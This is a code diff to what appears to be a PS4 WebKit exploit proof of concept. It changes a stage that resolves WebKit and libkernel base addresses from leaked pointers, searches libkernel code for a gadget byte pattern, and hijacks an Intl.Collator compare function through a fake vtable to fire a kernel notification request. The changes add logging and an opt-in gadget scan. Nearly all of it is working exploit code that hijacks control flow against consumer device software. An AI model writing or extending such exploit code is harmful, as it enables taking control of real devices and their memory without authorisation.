@@ -12,7 +12,8 @@ const FAKE_VTABLE_OFFSET = 0x300;
 const NOTIFICATION_REQUEST_SIZE = 0xc30;
 const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
 const DEFAULT_MESSAGE = "PS4 WebKit PoC";
-const LK_TEXT_SCAN = 0x80000;
+const LK_TEXT_SCAN = 0x40000;
+const LK_TEXT_SCAN_STEP = 16;
 const TRAMPOLINE_PATTERN = new Uint8Array([
     0x48, 0x8b, 0x8f, 0xe0, 0x00, 0x00, 0x00, 0x51,
     0x48, 0x8b, 0x4f, 0x60, 0x48, 0x8b, 0x7f, 0x48, 0xc3,
@@ -157,7 +158,9 @@ function resolveLibkernelFromGot(p, webkitBase, cfg, log) {
     return bases[0];
 }
 
-function findTrampolineRva(p, lk, knownRva, log) {
+function findTrampolineRva(p, lk, knownRva, log, opts) {
+    opts = opts || {};
+    const allowScan = opts.gdScan === true;
     if (knownRva > 0) {
         try {
             const addr = lk.add32(knownRva);
@@ -169,14 +172,26 @@ function findTrampolineRva(p, lk, knownRva, log) {
                 if (buf[i] !== TRAMPOLINE_PATTERN[i]) { ok = false; break; }
             }
             if (ok) {
-                log("NOTIFY-GD", "known gd=0x" + knownRva.toString(16));
+                log("NOTIFY-GD", "verified gd=0x" + knownRva.toString(16));
                 return knownRva;
             }
-            log("NOTIFY-GD", "gd=0x" + knownRva.toString(16) + " bytes mismatch — scan");
-        } catch (_) { }
+            log("NOTIFY-GD", "gd=0x" + knownRva.toString(16) + " bytes mismatch"
+                + (allowScan ? " — scanning" : " — use ?gd=0x… or ?gdscan=1"));
+        } catch (e) {
+            log("NOTIFY-GD", "read failed @ gd=0x" + knownRva.toString(16)
+                + " " + (e && e.message ? e.message : e));
+        }
     }
+    if (!allowScan) {
+        if (knownRva > 0) {
+            log("NOTIFY-GD-WARN", "using unverified gd=0x" + knownRva.toString(16));
+            return knownRva;
+        }
+        return null;
+    }
+    log("NOTIFY-GD-SCAN", "scanning lk .text (OOM risk) max=0x" + LK_TEXT_SCAN.toString(16));
     const patLen = TRAMPOLINE_PATTERN.length;
-    for (let rva = 0; rva < LK_TEXT_SCAN; rva += 4) {
+    for (let rva = 0; rva < LK_TEXT_SCAN; rva += LK_TEXT_SCAN_STEP) {
         try {
             let match = true;
             for (let i = 0; i < patLen; i++) {
@@ -221,6 +236,8 @@ export function stageCollatorNotify(ctx) {
     if (typeof leakval !== "function")
         throw new Error("notify: need leakval");
 
+    log("NOTIFY-STAGE", "resolve bases…");
+
     let webkitBase = ctx.webkitBase || null;
     if (!webkitBase && ctx.nativeFn && off.wk_expm1_builtin)
         webkitBase = ctx.nativeFn.sub32(off.wk_expm1_builtin);
@@ -235,15 +252,20 @@ export function stageCollatorNotify(ctx) {
     if (!lk || !inPs4ModuleBand(lk))
         lk = resolveLibkernelFromGot(p, webkitBase, cfg, log);
     if (!lk || !inPs4ModuleBand(lk))
-        throw new Error("notify: libkernel missing — 2e Leak+lk or Accept lk");
+        throw new Error("notify: libkernel missing — 2e Leak+lk or Accept fn");
 
-    const gdRva = findTrampolineRva(p, lk, cfg.gd, log);
+    log("NOTIFY-STAGE", "lk=" + lk + " — resolve gd trampoline");
+    const gdRva = findTrampolineRva(p, lk, cfg.gd, log, {
+        gdScan: ctx.gdScan === true,
+    });
     if (gdRva == null)
         throw new Error("notify: gd trampoline not found — ?gd=0x…");
 
     const ntRva = cfg.nt;
     if (!ntRva)
         throw new Error("notify: k_notify RVA missing in offset table");
+
+    log("NOTIFY-STAGE", "collator + arena…");
 
     const realCollator = new Intl.Collator("en", { usage: "search" });
     const compareFn = realCollator.compare;
@@ -345,9 +367,12 @@ export function fireCollatorNotify(st) {
 
 /** One-shot stage + fire. */
 export function runCollatorNotify(ctx) {
+    const log = ctx.log || function () { };
     const st = stageCollatorNotify(ctx);
     st.p = ctx.p;
+    log("NOTIFY-COMMIT", "patch collator → compareFn(0xc30 request)");
     const out = fireCollatorNotify(st);
+    log("NOTIFY-DONE", "result=" + out.result + " sent=" + out.sent);
     return Object.assign({ staged: st }, out);
 }
 
